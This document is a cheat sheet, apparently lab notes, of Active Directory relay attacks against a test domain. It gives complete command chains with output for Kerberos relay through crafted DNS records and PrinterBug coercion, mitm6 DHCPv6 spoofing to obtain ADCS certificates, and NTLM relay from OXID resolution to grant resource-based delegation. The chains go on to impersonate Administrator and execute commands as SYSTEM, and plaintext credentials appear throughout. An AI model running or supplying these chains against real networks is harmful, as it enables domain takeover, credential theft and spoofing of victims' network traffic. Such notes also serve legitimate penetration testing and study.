# Relay, Reflect

## KRB5

### relay by abusing the `CredMarshalTargetInfo()` function

```bash
dnstool -u 'sales.contoso.lab\intrasvc' -p '4dmD4v1D' \
-r 'win-srv011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' \
-d 192.168.1.145 --action add \
win-dc02.sales.contoso.lab
# [-] Connecting to host...
# [-] Binding to host
# [+] Bind OK
# [-] Adding new record
# [+] LDAP operation completed successfully

printerbug 'sales.contoso.org'/'intrasvc':'4dmD4v1D'@'win-dc02.sales.contoso.lab' \
'win-srv011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'

python3 /usr/share/krbrelayx/krbrelayx.py \
--target http://win-srv01.sales.contoso.lab/certsrv/ \
-ip 192.168.1.145 \
--adcs --template DomainController
# ...
# [*] Setting up DNS Server
# [*] Servers started, waiting for connections
# [*] SMBD: Received connection from 192.168.1.12
# [*] HTTP server returned status code 200, treating as a successful login
# [*] SMBD: Received connection from 192.168.1.12
# [-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
# [*] SMBD: Received connection from 192.168.1.12
# [-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
# [*] Generating CSR...
# [*] CSR generated!
# [*] Getting certificate...
# [*] GOT CERTIFICATE! ID 22
# [*] Writing PKCS#12 certificate to ./unknown5766.pfx
# [*] Certificate successfully written to file

python3 PKINITtools/gettgtpkinit.py \
-cert-pfx ../unknown5766.pfx \
"sales.contoso.lab/win-dc02" \
win-dc02.ccache \
-dc-ip 192.168.1.12
# Loading certificate and key from file
# Requesting TGT
# AS-REP encryption key (you might need this later):
# Saved TGT to file

export KRB5CCNAME=win-dc02.ccache
```

### relay the `AP-REQ` from `DNS Authenticated Updates`

Scenario:

- `http://win-srv01.sales.contoso.lab/certsrv/` - ADCS web enrollment endpoint
- `Machine` - template we are getting a certificate as, all domain machines have an enrollment right to Machine template by default
- `desktop-mw01.sales.contoso.lab` - victim machine (that is going to be targeted by mitm6 (DHCPv6 spoofing)). It is set explicitly to avoid breaking the network. Since `mitm6` assigns a malicious IPv6 DNS server address to victim machines. `--host-allowlist` makes sure that this malicious DNS server will be assigned only to a `desktop-mw01.sales.contoso.lab` machine.
- `--interface-ip` tells krbrelayx which local IP to bind its incoming listeners to

fix the mitm6 2 NIC bug (force packets out the configured interface):

```bash
sudo python3 -c "
import re
p='/usr/lib/python3/dist-packages/mitm6/mitm6.py'
s=open(p).read()
s=re.sub(r'sendp\(resp, verbose=False\)',
        'sendp(resp, iface=config.default_if, verbose=False)', s)
open(p,'w').write(s)
"
grep -n 'sendp(resp' /usr/lib/python3/dist-packages/mitm6/mitm6.py
```

```bash
sudo mitm6 --domain sales.contoso.lab \
--host-allowlist desktop-mw01.sales.contoso.lab \
--relay win-srv01.sales.contoso.lab -i eth1
# Starting mitm6 using the following configuration:
# Primary adapter: eth1 [bc:24:11:50:07:dd]
# IPv4 address: 192.168.1.145
# IPv6 address: fe80::1d1b:b770:8684:1ab9
# DNS local search domain: sales.contoso.lab
# DNS allowlist: sales.contoso.lab
# Hostname allowlist: desktop-mw01.sales.contoso.lab
# IPv6 address fe80::192:168:1:200 is now assigned to mac=bc:24:11:4e:41:e6 host=DESKTOP-MW01.sales.contoso.lab. ipv4=192.168.1.200
# Sent SOA reply

python3 /usr/share/krbrelayx/krbrelayx.py \
    --target http://win-srv01.sales.contoso.lab/certsrv/ \
    -ip 192.168.1.145 \
    --victim desktop-mw01.sales.contoso.lab \
    --adcs --template Machine
# ...
# [*] Setting up DNS Server
# [*] Servers started, waiting for connections
# [*] DNS: Client sent authorization
# [*] HTTP server returned status code 200, treating as a successful login
# [*] Generating CSR...
# [*] CSR generated!
# [*] Getting certificate...
# [*] GOT CERTIFICATE! ID 17
# [*] Writing PKCS#12 certificate to ./desktop-mw01.sales.contoso.lab.pfx
# [*] Certificate successfully written to file
# [*] DNS: Client sent authorization
# [*] HTTP server returned status code 200, treating as a successful login
# [*] Skipping user desktop-mw01.sales.contoso.lab since attack was already performed
```

## NTLM

### relay from `Initial OXID Resolution Request`

```bash
python3 examples/potato.py \
-clsid 'D99E6E74-FC88-11D0-B498-00A0C90312F3' \
-relay-ip 192.168.1.145 \
sales/alice:'1AM4l1c3!?1'@win-srv01.sales.contoso.lab

python3 rpcoxidresolver.py -oip 192.168.1.145 -rip 192.168.1.145 -rport 9997
# server start listening
# Got NTLM_TYPE_1 message. Replying with NTLM_TYPE_2
# Got NTLM_TYPE_3 message skipping it...
# Got resolveOxid2 request with auth_len != 0. Skipping it...
# ('unpack requires a buffer of 4 bytes', "When unpacking field 'alloc_hint | <L=0 | b''[:4]'")
# Got MSRPC_BIND message with no NTLM_TYPE_1 message. Replying with MSRPC_BINDACK
# [+] Got resolveOxid2 Request with auth_len == 0. Redirecting victim to rpc relay server 192.168.1.145[9997]
# ('unpack requires a buffer of 4 bytes', "When unpacking field 'alloc_hint | <L=0 | b''[:4]'")

ntlmrelayx.py -t ldap://win-dc02.sales.contoso.lab --rpc-port 9997 --delegate-access --escalate-user 'alice'
# ...
# [*] Servers started, waiting for connections
# [*] Callback added for UUID 99FCFEC4-5260-101B-BBCB-00AA0021347A V:0.0
# [*] RPCD: Received connection from 192.168.1.21, attacking target ldap://win-dc02.sales.contoso.lab
# [*] Authenticating against ldap://win-dc02.sales.contoso.lab as SALES\WIN-SRV01$ SUCCEED
# [*] Enumerating relayed user's privileges. This may take a while on large domains
# [-] Exception in RPC request handler: b'C\x01\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00F\x00\x00\x00\x00'
# [*] Delegation rights modified succesfully!
# [*] alice can now impersonate users on WIN-SRV01$ via S4U2Proxy

# confirm that user does indeed have RBCD right now
bloodyAD --host 192.168.1.12 -d sales.contoso.lab -u alice -p '1AM4l1c3!?1' get object 'win-srv01$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity
# distinguishedName: CN=WIN-SRV01,OU=Machines,DC=sales,DC=contoso,DC=lab
# msDS-AllowedToActOnBehalfOfOtherIdentity: O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-1548103905-787397850-1049434999-1104)(A;;0xf01ff;;;S-1-5-21-1548103905-787397850-1049434999-1104)(A;;0xf01ff;;;S-1-5-21-1548103905-787397850-1049434999-1105)

lookupsid.py sales.contoso.lab/alice:'1AM4l1c3!?1'@192.168.1.12 | grep -i "alice"
# 1105: SALES\alice (SidTypeUser)

addspn -u 'sales.contoso.lab\lmodifr' -p '94Dk5@!nDM' \
-s HOST/alice.sales.contoso.lab \
-t alice \
win-dc02.sales.contoso.lab
# [-] Connecting to host...
# [-] Binding to host
# [+] Bind OK
# [+] Found modification target
# [+] SPN Modified successfully

impacket-getST -spn 'CIFS/win-srv01.sales.contoso.lab' \
-impersonate Administrator \
-dc-ip 192.168.1.12 'sales.contoso.lab'/'alice':'1AM4l1c3!?1'
# [*] Getting TGT for user
# [*] Impersonating Administrator
# [*] Requesting S4U2self
# [*] Requesting S4U2Proxy
# [*] Saving ticket in Administrator@CIFS_win-srv01.sales.contoso.lab@SALES.CONTOSO.LAB.ccache

export KRB5CCNAME='Administrator@CIFS_win-srv01.sales.contoso.lab@SALES.CONTOSO.LAB.ccache'

nxc smb win-srv01.sales.contoso.lab -u Administrator -k --use-kcache
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-SRV01) (domain:sales.contoso.lab) (signing:False) (SMBv1:True)
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [+] sales.contoso.lab\Administrator from ccache (Pwn3d!)

nxc smb win-srv01.sales.contoso.lab -u Administrator -k --use-kcache --exec-method smbexec -x 'whoami /all'
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-SRV01) (domain:sales.contoso.lab) (signing:False) (SMBv1:True)
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [+] sales.contoso.lab\Administrator from ccache (Pwn3d!)
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [+] Executed command via smbexec
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        USER INFORMATION
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        ----------------
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        User Name           SID
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        =================== ========
# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        nt authority\system S-1-5-18
```
